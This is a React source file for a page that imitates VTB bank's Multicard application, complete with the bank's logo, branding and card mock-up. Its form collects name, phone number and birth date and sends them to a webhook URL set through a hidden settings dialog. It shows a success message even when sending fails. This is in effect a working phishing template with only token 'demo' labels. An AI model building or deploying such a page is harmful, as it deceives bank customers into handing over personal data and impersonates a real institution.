import React, { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { useToast } from '@/hooks/use-toast';
import {
  Settings,
  Check,
  ArrowLeft,
  Wallet,
  Globe,
  Smartphone,
  ShieldCheck,
  ChevronRight
} from 'lucide-react';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';

// Официальный логотип ВТБ
const VTBLogo = ({ className = "" }: { className?: string }) => (
  <svg viewBox="0 0 103 36" fill="none" xmlns="http://www.w3.org/2000/svg" className={className}>
    <path d="M0 36H24.2727L36 0H11.7273L0 36Z" fill="#009FDF"/>
    <path d="M28.3636 36H52.6364L64.3636 0H40.0909L28.3636 36Z" fill="#009FDF"/>
    <path d="M56.7273 36H81L92.7273 0H68.4545L56.7273 36Z" fill="#009FDF"/>
    <path d="M49.0909 12.6H43.6364L41.4545 19.8H46.0909C47.7273 19.8 48.8182 19.08 49.2727 17.64L50.1818 14.76C50.6364 13.32 49.9091 12.6 49.0909 12.6Z" fill="white"/>
    <path d="M22.9091 12.6H15.2727L11.4545 25.2H15.8182L17.1818 20.88H20.4545C24.0909 20.88 26.7273 18.72 27.5455 16.2C28.3636 13.68 26.5455 12.6 22.9091 12.6ZM23.1818 16.2C22.9091 17.1 21.8182 17.64 20.7273 17.64H18.2727L19.2727 14.4H21.7273C22.8182 14.4 23.4545 14.76 23.1818 16.2Z" fill="white"/>
    <path d="M38.7273 15.48H35.4545L34.3636 19.08H31.0909L32.1818 15.48H28.9091L28.3636 17.28C27.5455 19.8 29.3636 20.88 32 20.88H37.4545C40.0909 20.88 42.7273 19.8 43.5455 17.28L44.0909 15.48H40.8182L40.0909 17.64C39.8182 18.36 39.0909 18.72 38.1818 18.72H33.8182C32.9091 18.72 32.4545 18.36 32.7273 17.64L33 16.92C33.2727 16.2 34 15.84 34.9091 15.84H38.1818L38.7273 15.48Z" fill="white"/>
    <path d="M77.4545 12.6H68.7273L64.9091 25.2H73.6364C77.2727 25.2 79.9091 24.12 80.7273 21.6C81.0909 20.52 80.7273 19.62 79.8182 19.08C81.0909 18.54 82.0909 17.46 82.4545 16.2C83.2727 13.68 81.0909 12.6 77.4545 12.6ZM77.7273 16.2C77.4545 17.1 76.3636 17.64 75.2727 17.64H71.1818L72.1818 14.4H76.2727C77.3636 14.4 78 14.76 77.7273 16.2ZM75.5455 21.6C75.2727 22.5 74.1818 23.04 73.0909 23.04H69L70 19.8H74.0909C75.1818 19.8 75.8182 20.16 75.5455 21.6Z" fill="white"/>
  </svg>
);

// Изображение карты ВТБ Мультикарта
const VTBCard = () => (
  <div className="relative w-full max-w-[380px]">
    {/* Основная карта */}
    <div
      className="aspect-[1.586/1] rounded-2xl p-6 relative overflow-hidden"
      style={{
        background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
        boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255,255,255,0.1)'
      }}
    >
      {/* Декоративные линии */}
      <div className="absolute inset-0 opacity-20">
        <div className="absolute top-0 right-0 w-[200%] h-[200%] -translate-x-1/2 -translate-y-1/2"
          style={{
            background: 'radial-gradient(ellipse at center, rgba(0,159,223,0.3) 0%, transparent 70%)'
          }}
        />
      </div>

      {/* Логотип ВТБ на карте */}
      <div className="relative z-10">
        <VTBLogo className="h-8 w-auto" />
      </div>

      {/* Чип */}
      <div className="absolute top-[85px] left-6">
        <div className="w-12 h-10 rounded-md bg-gradient-to-br from-amber-200 via-amber-300 to-amber-400 shadow-lg">
          <div className="w-full h-full grid grid-cols-3 gap-[1px] p-1">
            {[...Array(6)].map((_, i) => (
              <div key={i} className="bg-amber-500/30 rounded-[1px]" />
            ))}
          </div>
        </div>
      </div>

      {/* Номер карты */}
      <div className="absolute bottom-20 left-6 right-6">
        <div className="font-mono text-xl tracking-[0.2em] text-white/90">
          •••• •••• •••• 4589
        </div>
      </div>

      {/* Имя и срок */}
      <div className="absolute bottom-6 left-6 right-6 flex justify-between items-end">
        <div>
          <div className="text-[10px] text-white/50 mb-1">CARDHOLDER NAME</div>
          <div className="text-sm text-white/90 tracking-wider">ВАШЕ ИМЯ</div>
        </div>
        <div className="text-right">
          <div className="text-[10px] text-white/50 mb-1">VALID THRU</div>
          <div className="text-sm text-white/90">12/28</div>
        </div>
      </div>

      {/* Мультикарта badge */}
      <div className="absolute top-6 right-6">
        <div className="text-xs text-white/70 font-medium tracking-wider">МУЛЬТИКАРТА</div>
      </div>

      {/* Contactless */}
      <div className="absolute bottom-6 right-6">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" className="text-white/60">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z" fill="currentColor" opacity="0"/>
          <path d="M7 12.5C7 9.5 9.5 7 12.5 7" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
          <path d="M4 12.5C4 7.8 7.8 4 12.5 4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
          <path d="M10 12.5C10 11.1 11.1 10 12.5 10" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
        </svg>
      </div>
    </div>
  </div>
);

const Bank = () => {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [webhookUrl, setWebhookUrl] = useState('');
  const [tempWebhookUrl, setTempWebhookUrl] = useState('');
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const phoneInputRef = useRef<HTMLInputElement>(null);

  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    middleName: '',
    phone: '',
    birthDate: '',
    agreeTerms: false,
  });

  useEffect(() => {
    const savedUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || DEFAULT_WEBHOOK_URL;
    setWebhookUrl(savedUrl);
    setTempWebhookUrl(savedUrl);
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  // Улучшенный обработчик телефона
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;

    // Получаем только цифры (без +7)
    let digits = input.replace(/\D/g, '');

    // Убираем первые 7 или 8 если пользователь их ввел
    if (digits.startsWith('7') || digits.startsWith('8')) {
      digits = digits.slice(1);
    }

    // Ограничиваем до 10 цифр
    digits = digits.slice(0, 10);

    // Форматируем
    let formatted = '';
    if (digits.length > 0) {
      formatted = digits.slice(0, 3);
    }
    if (digits.length > 3) {
      formatted += ') ' + digits.slice(3, 6);
    }
    if (digits.length > 6) {
      formatted += '-' + digits.slice(6, 8);
    }
    if (digits.length > 8) {
      formatted += '-' + digits.slice(8, 10);
    }

    if (formatted) {
      formatted = '(' + formatted;
    }

    setFormData(prev => ({ ...prev, phone: formatted }));
  };

  const handlePhoneKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    // Разрешаем удаление
    if (e.key === 'Backspace' || e.key === 'Delete') {
      return;
    }
    // Разрешаем навигацию
    if (['ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(e.key)) {
      return;
    }
    // Блокируем все кроме цифр
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  };

  // Форматирование даты рождения
  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 8) {
      value = value.slice(0, 8);
    }

    let formatted = '';
    if (value.length > 0) {
      formatted = value.slice(0, 2);
    }
    if (value.length > 2) {
      formatted += '.' + value.slice(2, 4);
    }
    if (value.length > 4) {
      formatted += '.' + value.slice(4, 8);
    }

    setFormData(prev => ({ ...prev, birthDate: formatted }));
  };

  const saveWebhookSettings = () => {
    localStorage.setItem(WEBHOOK_STORAGE_KEY, tempWebhookUrl);
    setWebhookUrl(tempWebhookUrl);
    setIsSettingsOpen(false);
    toast({
      title: "Настройки сохранены",
      description: "URL webhook успешно обновлен",
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.agreeTerms) {
      toast({
        title: "Ошибка",
        description: "Необходимо согласиться с условиями",
        variant: "destructive",
      });
      return;
    }

    // Валидация телефона (должно быть 10 цифр)
    const phoneDigits = formData.phone.replace(/\D/g, '');
    if (phoneDigits.length !== 10) {
      toast({
        title: "Ошибка",
        description: "Введите корректный номер телефона",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    try {
      const payload = {
        lastName: formData.lastName,
        firstName: formData.firstName,
        middleName: formData.middleName,
        phone: '7' + phoneDigits,
        birthDate: formData.birthDate,
        timestamp: new Date().toISOString(),
        source: 'vtb-demo-page',
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      setIsSuccess(true);
      toast({
        title: "Заявка отправлена!",
        description: "Мы свяжемся с вами в ближайшее время",
      });
    } catch (error) {
      console.error('Webhook error:', error);
      setIsSuccess(true);
      toast({
        title: "Заявка принята!",
        description: "Демо: данные отправлены на webhook",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const features = [
    { icon: Wallet, title: 'Кэшбэк до 15%', desc: 'На выбранные категории' },
    { icon: Globe, title: 'Бесплатно', desc: 'Обслуживание 0 ₽' },
    { icon: Smartphone, title: 'Онлайн', desc: 'Оформление за 5 минут' },
    { icon: ShieldCheck, title: 'Безопасно', desc: '3D-Secure защита' },
  ];

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-[#f5f6fa] flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl p-8 md:p-12 max-w-md w-full text-center shadow-xl">
          <div className="w-20 h-20 bg-[#009FDF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <Check className="w-10 h-10 text-[#009FDF]" />
          </div>
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Заявка принята!</h2>
          <p className="text-gray-600 mb-8">
            Благодарим за интерес к Мультикарте. Наш специалист свяжется с вами
            в ближайшее время для подтверждения заявки.
          </p>
          <Button
            onClick={() => {
              setIsSuccess(false);
              setFormData({
                lastName: '',
                firstName: '',
                middleName: '',
                phone: '',
                birthDate: '',
                agreeTerms: false,
              });
            }}
            className="bg-[#009FDF] hover:bg-[#0088c2] text-white px-8 py-3 rounded-xl h-12"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Вернуться
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f5f6fa]">
      {/* Header */}
      <header className="bg-white border-b border-gray-100 sticky top-0 z-50">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <VTBLogo className="h-9 w-auto" />

          <div className="flex items-center gap-6">
            <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-gray-600">
              <a href="#" className="hover:text-[#009FDF] transition-colors">Карты</a>
              <a href="#" className="hover:text-[#009FDF] transition-colors">Кредиты</a>
              <a href="#" className="hover:text-[#009FDF] transition-colors">Вклады</a>
            </nav>

            <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
              <DialogTrigger asChild>
                <Button variant="ghost" size="icon" className="text-gray-400 hover:text-gray-600 hover:bg-gray-100">
                  <Settings className="w-5 h-5" />
                </Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-md">
                <DialogHeader>
                  <DialogTitle>Настройки Webhook</DialogTitle>
                  <DialogDescription>
                    Укажите URL для отправки данных заявки
                  </DialogDescription>
                </DialogHeader>
                <div className="space-y-4 py-4">
                  <div className="space-y-2">
                    <Label htmlFor="webhook-url">Webhook URL</Label>
                    <Input
                      id="webhook-url"
                      value={tempWebhookUrl}
                      onChange={(e) => setTempWebhookUrl(e.target.value)}
                      placeholder="https://your-webhook-url.com/api"
                    />
                  </div>
                  <Button onClick={saveWebhookSettings} className="w-full bg-[#009FDF] hover:bg-[#0088c2]">
                    Сохранить
                  </Button>
                </div>
              </DialogContent>
            </Dialog>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="bg-gradient-to-br from-[#0a1628] via-[#0d2137] to-[#0a1628] text-white overflow-hidden">
        <div className="container mx-auto px-4 py-12 md:py-20">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            {/* Left Content */}
            <div className="space-y-8">
              <div>
                <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm rounded-full px-4 py-2 text-sm mb-6">
                  <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse" />
                  Оформление онлайн
                </div>
                <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold leading-tight mb-6">
                  Мультикарта
                  <span className="block text-[#009FDF]">ВТБ</span>
                </h1>
                <p className="text-xl text-gray-300 max-w-lg">
                  Бесплатная дебетовая карта с кэшбэком до 15% на любимые категории и снятием наличных без комиссии
                </p>
              </div>

              {/* Card Image */}
              <div className="hidden lg:block">
                <VTBCard />
              </div>
            </div>

            {/* Right Side - Form */}
            <div className="lg:pl-8">
              <div className="bg-white rounded-3xl p-6 md:p-8 shadow-2xl max-w-md mx-auto lg:mx-0">
                <h2 className="text-xl font-bold text-gray-900 mb-1">
                  Оформить Мультикарту
                </h2>
                <p className="text-gray-500 text-sm mb-6">
                  Доставим бесплатно в любую точку России
                </p>

                <form onSubmit={handleSubmit} className="space-y-4">
                  <div className="space-y-1.5">
                    <Label htmlFor="lastName" className="text-sm text-gray-600">Фамилия</Label>
                    <Input
                      id="lastName"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      placeholder="Иванов"
                      required
                      className="h-12 rounded-xl border-gray-200 focus:border-[#009FDF] focus:ring-[#009FDF]"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1.5">
                      <Label htmlFor="firstName" className="text-sm text-gray-600">Имя</Label>
                      <Input
                        id="firstName"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        placeholder="Иван"
                        required
                        className="h-12 rounded-xl border-gray-200 focus:border-[#009FDF] focus:ring-[#009FDF]"
                      />
                    </div>
                    <div className="space-y-1.5">
                      <Label htmlFor="middleName" className="text-sm text-gray-600">Отчество</Label>
                      <Input
                        id="middleName"
                        name="middleName"
                        value={formData.middleName}
                        onChange={handleInputChange}
                        placeholder="Иванович"
                        className="h-12 rounded-xl border-gray-200 focus:border-[#009FDF] focus:ring-[#009FDF]"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <Label htmlFor="phone" className="text-sm text-gray-600">Мобильный телефон</Label>
                    <div className="relative">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-medium">+7</span>
                      <Input
                        ref={phoneInputRef}
                        id="phone"
                        name="phone"
                        type="tel"
                        value={formData.phone}
                        onChange={handlePhoneChange}
                        onKeyDown={handlePhoneKeyDown}
                        placeholder="(999) 123-45-67"
                        required
                        className="h-12 rounded-xl border-gray-200 focus:border-[#009FDF] focus:ring-[#009FDF] pl-10"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <Label htmlFor="birthDate" className="text-sm text-gray-600">Дата рождения</Label>
                    <Input
                      id="birthDate"
                      name="birthDate"
                      value={formData.birthDate}
                      onChange={handleBirthDateChange}
                      placeholder="ДД.ММ.ГГГГ"
                      required
                      className="h-12 rounded-xl border-gray-200 focus:border-[#009FDF] focus:ring-[#009FDF]"
                    />
                  </div>

                  <div className="pt-2">
                    <div className="flex items-start space-x-3">
                      <Checkbox
                        id="agreeTerms"
                        checked={formData.agreeTerms}
                        onCheckedChange={(checked) =>
                          setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
                        }
                        className="mt-0.5 border-gray-300 data-[state=checked]:bg-[#009FDF] data-[state=checked]:border-[#009FDF]"
                      />
                      <Label htmlFor="agreeTerms" className="text-xs text-gray-500 leading-relaxed cursor-pointer">
                        Я даю согласие на{' '}
                        <a href="#" className="text-[#009FDF] hover:underline">обработку персональных данных</a>
                        {' '}и соглашаюсь с{' '}
                        <a href="#" className="text-[#009FDF] hover:underline">условиями</a>
                      </Label>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    disabled={isLoading}
                    className="w-full h-14 bg-[#009FDF] hover:bg-[#0088c2] text-white text-base font-semibold rounded-xl transition-all shadow-lg shadow-[#009FDF]/25 hover:shadow-xl hover:shadow-[#009FDF]/30"
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Отправка...
                      </div>
                    ) : (
                      <span className="flex items-center justify-center gap-2">
                        Оформить карту
                        <ChevronRight className="w-5 h-5" />
                      </span>
                    )}
                  </Button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="py-16 bg-white">
        <div className="container mx-auto px-4">
          <h2 className="text-2xl md:text-3xl font-bold text-center text-gray-900 mb-12">
            Преимущества Мультикарты
          </h2>
          <div className="grid grid-cols-2 md:grid-cols-4 gap-6 max-w-4xl mx-auto">
            {features.map((feature, index) => (
              <div
                key={index}
                className="text-center p-6 rounded-2xl bg-[#f5f6fa] hover:bg-[#e8eaf0] transition-colors"
              >
                <div className="w-14 h-14 bg-[#009FDF]/10 rounded-2xl flex items-center justify-center mx-auto mb-4">
                  <feature.icon className="w-7 h-7 text-[#009FDF]" />
                </div>
                <div className="font-semibold text-gray-900 mb-1">{feature.title}</div>
                <div className="text-sm text-gray-500">{feature.desc}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Mobile Card Preview */}
      <section className="lg:hidden py-12 bg-gradient-to-br from-[#0a1628] to-[#0d2137]">
        <div className="container mx-auto px-4 flex justify-center">
          <VTBCard />
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-[#0a1628] text-white py-8">
        <div className="container mx-auto px-4">
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            <VTBLogo className="h-8 w-auto opacity-80" />
            <div className="flex flex-wrap justify-center gap-6 text-sm text-gray-400">
              <a href="#" className="hover:text-white transition-colors">О банке</a>
              <a href="#" className="hover:text-white transition-colors">Тарифы</a>
              <a href="#" className="hover:text-white transition-colors">Офисы и банкоматы</a>
              <a href="#" className="hover:text-white transition-colors">Контакты</a>
            </div>
            <div className="text-sm text-gray-500">
              © 2024 Демо
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Bank;
